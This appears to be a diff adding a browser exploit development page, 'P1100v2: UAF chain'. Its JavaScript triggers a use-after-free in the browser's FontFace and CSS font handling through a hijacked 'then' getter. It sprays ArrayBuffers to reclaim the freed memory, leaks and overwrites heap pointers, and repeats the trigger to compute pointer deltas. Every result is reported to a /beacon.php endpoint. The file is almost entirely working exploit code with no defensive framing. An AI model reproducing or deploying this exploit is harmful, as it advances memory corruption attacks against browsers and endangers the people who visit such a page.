@@ -1,0 +1,350 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p1100v2</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0a0f;color:#c8ffc8;font:13px/1.6 monospace;padding:16px;min-height:100vh}
+#log{white-space:pre-wrap;word-break:break-all}
+.hit{color:#ff6;font-weight:bold}
+.ptr{color:#f6f;font-weight:bold}
+.fail{color:#f66}
+.ok{color:#6f6}
+.info{color:#6cf}
+.crit{color:#f00;font-weight:bold;font-size:14px}
+.win{color:#0f0;font-weight:bold;font-size:15px}
+.phase{color:#fff;font-size:14px;font-weight:bold;margin:8px 0}
+#prog{height:4px;background:#222;margin:8px 0;border-radius:2px}
+#bar{height:100%;background:#6f6;border-radius:2px;width:0%;transition:width 0.3s}
+</style>
+</head><body>
+<h2 style="color:#fff;font-size:16px;margin-bottom:4px">P1100v2: UAF chain — scan ALL buffers + deferred tests</h2>
+<div id="prog"><div id="bar"></div></div>
+<div id="log"></div>
+<script>
+var L=document.getElementById('log'),bar=document.getElementById('bar');
+function log(cls,msg){var d=document.createElement('div');d.className=cls;d.textContent=msg;L.appendChild(d);L.scrollTop=L.scrollHeight;}
+function B(tag,data){try{new Image().src='/beacon.php?tag='+encodeURIComponent(tag)+'&data='+encodeURIComponent(data||'')+'&_='+Math.random();}catch(e){}}
+
+var SIZES=[64,96,128,160,192,224,256,320,384,512,768,1024,2048];
+var K=8;
+
+B('P1100v2-BOOT','');
+
+// ============================================================
+// Phase 1: EXACT P1099 trigger — minimal code before spray
+// ============================================================
+var styleEl=null,firedHere=false,map=null,hitEntry=null,hitIdx=-1;
+var cssRuleRef=null;
+
+var A=new FontFace('f0','local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(A);
+void A.loaded;
+styleEl=document.createElement('style');
+styleEl.textContent="@font-face{font-family:s0;src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(styleEl);
+
+firedHere=false;
+Object.defineProperty(FontFace.prototype,'then',{
+  configurable:true,
+  get:function(){
+    if(firedHere)return undefined;
+    firedHere=true;
+    cssRuleRef=this;
+    if(styleEl)styleEl.remove();
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    map=[];
+    for(var si=0;si<SIZES.length;si++){
+      var sz=SIZES[si];
+      for(var k=0;k<K;k++){
+        var ab=new ArrayBuffer(sz);
+        map.push({size:sz,ab:ab,view:new Uint8Array(ab),idx:si*K+k});
+      }
+    }
+    try{document.fonts.check('1em s0');}catch(e){}
+    return undefined;
+  },
+  set:function(){}
+});
+document.fonts.load('1em f0, s0','AB').then(function(){},function(){});
+
+// Poll for engine writes — scan ALL 192-byte buffers, not just #37
+var patched=false,leakedPtrs=null,patchTime=0;
+for(var t=15;t<=200;t+=5){
+  (function(ms){
+    setTimeout(function(){
+      if(patched||!map)return;
+      if(typeof BigUint64Array==='undefined')return;
+      // Scan ALL 192-byte buffers (indices 32-39)
+      for(var bi=32;bi<40;bi++){
+        if(!map[bi])continue;
+        var b64=new BigUint64Array(map[bi].ab);
+        var nz=0;
+        for(var qi=0;qi<b64.length;qi++)if(b64[qi]!==0n)nz++;
+        if(nz>0&&!patched){
+          patched=true;
+          patchTime=ms;
+          hitEntry=map[bi];
+          hitIdx=bi;
+          leakedPtrs=[];
+          for(var qi=0;qi<b64.length;qi++){
+            if(b64[qi]!==0n)leakedPtrs.push({off:qi*8,val:b64[qi]});
+          }
+          b64[0]=0x100n;
+          var pstr=leakedPtrs.map(function(p){return'+0x'+p.off.toString(16)+'=0x'+p.val.toString(16);}).join(',');
+          log('crit','PATCHED buf#'+bi+' at '+ms+'ms! nz='+nz);
+          log('ptr',pstr);
+          B('P1100v2-PATCH','buf='+bi+'|ms='+ms+'|'+pstr);
+          bar.style.width='25%';
+        }
+      }
+    },ms);
+  })(t);
+}
+
+// After stabilization, run deferred tests
+setTimeout(function(){
+  if(!patched){
+    log('fail','No reclaim detected in 192-byte buffers after 500ms');
+    // Also scan other sizes as fallback
+    var found=false;
+    for(var i=0;i<map.length;i++){
+      var v=map[i].view;
+      var nz=0;
+      for(var j=0;j<v.length;j++)if(v[j]!==0)nz++;
+      if(nz>0){
+        log('hit','Found non-zero in buf#'+i+' size='+map[i].size+' nz='+nz);
+        found=true;
+        if(map[i].size===192){
+          log('crit','192-byte hit at buf#'+i+'!');
+          hitEntry=map[i];hitIdx=i;
+          if(typeof BigUint64Array!=='undefined'){
+            var b64=new BigUint64Array(map[i].ab);
+            b64[0]=0x100n;patched=true;patchTime=500;
+            leakedPtrs=[];
+            for(var qi=0;qi<b64.length;qi++){
+              if(b64[qi]!==0n)leakedPtrs.push({off:qi*8,val:b64[qi]});
+            }
+            B('P1100v2-LATE-PATCH','buf='+i+'|ptrs='+leakedPtrs.length);
+          }
+        }
+      }
+    }
+    if(!found){
+      log('fail','ZERO non-zero buffers across all sizes. Reclaim failed completely.');
+      B('P1100v2-NOHIT','');
+    }
+    if(!patched)return;
+  }
+
+  log('ok','Stable at 500ms. Running deferred tests...');
+  bar.style.width='30%';
+
+  // ============================================================
+  // Test A: Monitor for engine modifications
+  // ============================================================
+  var b64=new BigUint64Array(hitEntry.ab);
+  var snap=[];
+  for(var qi=0;qi<b64.length;qi++)snap.push(b64[qi]);
+
+  setTimeout(function(){
+    log('','');
+    log('phase','Test A: Buffer stability check (2s)');
+    var changes=[];
+    for(var qi=0;qi<b64.length;qi++){
+      if(b64[qi]!==snap[qi])changes.push('+0x'+(qi*8).toString(16)+': 0x'+snap[qi].toString(16)+'->0x'+b64[qi].toString(16));
+    }
+    if(changes.length>0){
+      log('crit','Engine MODIFIED buffer! '+changes.join(', '));
+      B('P1100v2-MOD',changes.join(','));
+    }else{
+      log('ok','Buffer stable for 2s');
+      B('P1100v2-STABLE','2s');
+    }
+    bar.style.width='40%';
+
+    // ============================================================
+    // Test B: FontFace property access
+    // ============================================================
+    log('','');
+    log('phase','Test B: FontFace property access');
+
+    var props=['family','style','weight','unicodeRange','variant','featureSettings','display','status'];
+    var snap2=[];
+    for(var qi=0;qi<b64.length;qi++)snap2.push(b64[qi]);
+
+    // Test cssRuleRef (the freed FontFace)
+    if(cssRuleRef){
+      log('info','cssRuleRef properties:');
+      var propResults=[];
+      for(var i=0;i<props.length;i++){
+        try{
+          var val=cssRuleRef[props[i]];
+          propResults.push(props[i]+'='+String(val).substring(0,50));
+          log('ok','  .'+props[i]+' = "'+String(val).substring(0,50)+'"');
+        }catch(e){
+          propResults.push(props[i]+'=ERR:'+e.message.substring(0,30));
+          log('fail','  .'+props[i]+' THREW: '+e.message.substring(0,60));
+        }
+      }
+      B('P1100v2-PROPS',propResults.join('|').substring(0,600));
+
+      // Check buffer changes from property access
+      var propChanges=[];
+      for(var qi=0;qi<b64.length;qi++){
+        if(b64[qi]!==snap2[qi])propChanges.push('+0x'+(qi*8).toString(16)+':0x'+snap2[qi].toString(16)+'->0x'+b64[qi].toString(16));
+      }
+      if(propChanges.length>0){
+        log('crit','Property access MODIFIED buffer! '+propChanges.join(', '));
+        B('P1100v2-PROP-MOD',propChanges.join(','));
+      }else{
+        log('info','Property access did not modify buffer');
+      }
+    }else{
+      log('fail','cssRuleRef is null');
+      B('P1100v2-NOCSS','');
+    }
+
+    // Test A ref
+    log('','');
+    log('info','fontFaceRef (f0) properties:');
+    var snap3=[];
+    for(var qi=0;qi<b64.length;qi++)snap3.push(b64[qi]);
+    for(var i=0;i<props.length;i++){
+      try{
+        var val=A[props[i]];
+        log('ok','  .'+props[i]+' = "'+String(val).substring(0,50)+'"');
+      }catch(e){
+        log('fail','  .'+props[i]+' THREW: '+e.message.substring(0,60));
+      }
+    }
+    var aChanges=[];
+    for(var qi=0;qi<b64.length;qi++){
+      if(b64[qi]!==snap3[qi])aChanges.push('+0x'+(qi*8).toString(16));
+    }
+    if(aChanges.length>0){
+      log('hit','FontFace A access modified buffer at: '+aChanges.join(', '));
+      B('P1100v2-A-MOD',aChanges.join(','));
+    }
+
+    bar.style.width='60%';
+
+    // ============================================================
+    // Test C: GC + fonts.check interaction
+    // ============================================================
+    setTimeout(function(){
+      log('','');
+      log('phase','Test C: GC pressure + fonts API interaction');
+      var snap4=[];
+      for(var qi=0;qi<b64.length;qi++)snap4.push(b64[qi]);
+
+      // GC pressure
+      var g=[];
+      for(var i=0;i<5000;i++)g.push(new ArrayBuffer(10000));
+      g=null;
+
+      try{document.fonts.check('1em s0');}catch(e){}
+      try{document.fonts.check('1em f0');}catch(e){}
+
+      setTimeout(function(){
+        var gcChanges=[];
+        for(var qi=0;qi<b64.length;qi++){
+          if(b64[qi]!==snap4[qi])gcChanges.push('+0x'+(qi*8).toString(16)+':0x'+snap4[qi].toString(16)+'->0x'+b64[qi].toString(16));
+        }
+        if(gcChanges.length>0){
+          log('crit','GC MODIFIED buffer! '+gcChanges.join(', '));
+          B('P1100v2-GC-MOD',gcChanges.join(','));
+        }else{
+          log('ok','Buffer stable through GC + fonts.check');
+          B('P1100v2-GC-OK','');
+        }
+        bar.style.width='80%';
+
+        // ============================================================
+        // Test D: Second UAF trigger
+        // ============================================================
+        log('','');
+        log('phase','Test D: Second CSSFontFace UAF');
+
+        var se2=document.createElement('style');
+        se2.textContent="@font-face{font-family:s1;src:local(Arial);unicode-range:U+0043;}";
+        document.head.appendChild(se2);
+        var B2=new FontFace('f1','local(Helvetica)',{unicodeRange:'U+0043'});
+        document.fonts.add(B2);
+        void B2.loaded;
+
+        var map2=null,fired2=false,patched2=false;
+        Object.defineProperty(FontFace.prototype,'then',{
+          configurable:true,
+          get:function(){
+            if(fired2)return undefined;
+            fired2=true;
+            se2.remove();
+            try{document.fonts.delete(this);}catch(e){}
+            document.body.offsetHeight;
+            map2=[];
+            for(var si=0;si<SIZES.length;si++){
+              var sz=SIZES[si];
+              for(var k=0;k<K;k++){
+                var ab2=new ArrayBuffer(sz);
+                map2.push({size:sz,ab:ab2,view:new Uint8Array(ab2),idx:si*K+k});
+              }
+            }
+            try{document.fonts.check('1em s1');}catch(e){}
+            return undefined;
+          },
+          set:function(){}
+        });
+        document.fonts.load('1em f1, s1','CD').then(function(){},function(){});
+
+        // Poll second trigger
+        for(var t2=15;t2<=200;t2+=5){
+          (function(ms){
+            setTimeout(function(){
+              if(patched2||!map2)return;
+              for(var bi=32;bi<40;bi++){
+                if(!map2[bi])continue;
+                var b2=new BigUint64Array(map2[bi].ab);
+                var nz=0;
+                for(var qi=0;qi<b2.length;qi++)if(b2[qi]!==0n)nz++;
+                if(nz>0&&!patched2){
+                  patched2=true;
+                  b2[0]=0x100n;
+                  var ptrs2=[];
+                  for(var qi=0;qi<b2.length;qi++){
+                    if(b2[qi]!==0n)ptrs2.push({off:qi*8,val:b2[qi]});
+                  }
+                  log('crit','SECOND UAF patched buf#'+bi+' at '+ms+'ms!');
+                  var p2s=ptrs2.map(function(p){return'+0x'+p.off.toString(16)+'=0x'+p.val.toString(16);}).join(',');
+                  log('ptr',p2s);
+                  B('P1100v2-T2-PATCH','buf='+bi+'|ms='+ms+'|'+p2s);
+
+                  // Compare
+                  var p1_58=leakedPtrs.find(function(p){return p.off===0x58;});
+                  var p2_58=ptrs2.find(function(p){return p.off===0x58;});
+                  var p1_68=leakedPtrs.find(function(p){return p.off===0x68;});
+                  var p2_68=ptrs2.find(function(p){return p.off===0x68;});
+                  if(p1_58&&p2_58)log('ptr','  +0x58 delta: '+(p2_58.val-p1_58.val).toString());
+                  if(p1_68&&p2_68)log('ptr','  +0x68 delta: '+(p2_68.val-p1_68.val).toString());
+                  B('P1100v2-DELTA','d58='+(p1_58&&p2_58?(p2_58.val-p1_58.val).toString():'?')+'|d68='+(p1_68&&p2_68?(p2_68.val-p1_68.val).toString():'?'));
+                }
+              }
+            },ms);
+          })(t2);
+        }
+
+        // Final
+        setTimeout(function(){
+          bar.style.width='100%';
+          log('','');
+          log('phase','=== P1100v2 Summary ===');
+          log('win','Trigger 1: buf#'+hitIdx+' patched at '+patchTime+'ms');
+          if(patched2)log('win','Trigger 2: STABLE');
+          else log('info','Trigger 2: no reclaim (may need different spray)');
+          B('P1100v2-DONE','t1='+patchTime+'|t1buf='+hitIdx+'|t2='+patched2);
+        },3000);
+
+      },1000);
+    },500);
+  },2000);
+},500);
+</script>
+</body></html>
